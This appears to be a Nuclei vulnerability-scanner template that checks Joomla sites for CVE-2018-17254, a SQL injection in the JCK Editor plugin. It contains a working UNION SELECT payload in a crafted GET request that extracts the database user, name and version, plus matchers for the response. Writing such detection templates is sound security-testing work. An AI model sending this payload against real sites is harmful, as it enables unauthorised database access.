id: CVE-2018-17254-joomla-jck-editor-sql-injection

info:
  author: Suman_Kar
  name: Joomla JCK Editor SQL Injection CVE-2018-17254
  severity: high
  tags: joomla,sqli

requests:
  - raw:
      - |
        GET /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),0x6e75636c65692d74656d706c617465),NULL,NULL,NULL,NULL,NULL--%20aa HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
        Referer: {{BaseURL}}

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - nuclei-template
      - type: regex
        part: body
        regex:
          - Mod_Security
